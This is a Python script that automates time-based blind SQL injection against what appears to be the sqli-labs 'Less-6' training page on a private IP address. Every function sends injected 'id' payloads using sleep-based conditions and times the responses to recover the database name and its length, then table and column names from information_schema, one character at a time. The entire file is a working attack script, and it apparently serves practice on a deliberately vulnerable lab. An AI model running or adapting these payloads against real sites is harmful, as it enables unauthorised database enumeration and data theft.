# coding:utf-8
from threading import Thread
import requests
import datetime
import time

result = ''
url = "http://192.168.3.133/sqli/Less-6/index.php"

# 获取数据库名长度
def database_len():
    global result
    for i in range(1, 10):
        payload = " ?id=1\" and if(length(database())>%s,sleep(1),0) --+" % i
        # print(url+payload+'%23')
        time1 = datetime.datetime.now()
        r = requests.get(url + payload)
        time2 = datetime.datetime.now()
        sec = (time2 - time1).seconds
        if sec >= 1:
            print(i)
        else:
            print(i)
            print('database_len:', i)
            result += '数据库名长度:' + str(i) + '\t\n'
            break

# 获取数据库名
def database_name():
    global result
    database = ''
    for j in range(1, 20):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz':
            payload = "?id=1\" and if(substr(database(),%d,1)='%s',sleep(3),1) --+" % (j, i)
            # print(url+payload)
            time1 = datetime.datetime.now()
            r = requests.get(url + payload)
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec >= 3:
                database += i
                print(database)
                break

    print('database_name:', database)
    result += '数据库名:'+database+'\t\n'

# 获取表名
def table_name():
    global result
    tables = ''

    for n in range(0, 20):
        for j in range(1, 9):
            for i in '0123456789abcdefghijklmnopqrstuvwxyz':
                payload = "?id=1\" and if(substr((" \
                          "select table_name from information_schema.tables " \
                          "where table_schema=database() limit %d,1),%d,1)='%s',sleep(3),1) --+" % (n, j, i)
                # print(url+payload)
                time1 = datetime.datetime.now()
                r = requests.get(url + payload)
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                if sec >= 3:
                    tables += i
                    print(tables)
                    break
        tables += ','
    print('tables_name:', tables)
    result += '表名:'+tables+'\t\n'

# 获取列名
def column_name():
    global result
    clumns = ''
    for n in range(0, 20):
        for j in range(1, 9):
            for i in '0123456789abcdefghijklmnopqrstuvwxyz':
                payload = "?id=1\" and if(substr((" \
                          "select column_name from information_schema.columns " \
                          "where table_schema=database() limit %d,1),%d,1)='%s',sleep(3),1) --+" % (n, j, i)
                # print(url+payload)
                time1 = datetime.datetime.now()
                r = requests.get(url + payload)
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                if sec >= 3:
                    clumns += i
                    print(clumns)
                    break
        clumns += ','

    print('clumn_name:', clumns)
    result += '列名:'+clumns + '\t\n'


t1 = Thread(target=database_name)
t2 = Thread(target=table_name)
t3 = Thread(target=column_name)
t4 = Thread(target=database_len)

if __name__ == '__main__':
    # t1.start()
    # t2.start()
    # t3.start()
    # t4.start()
    # t1.join()
    # t2.join()
    # t3.join()
    # t4.join()
    print(result)
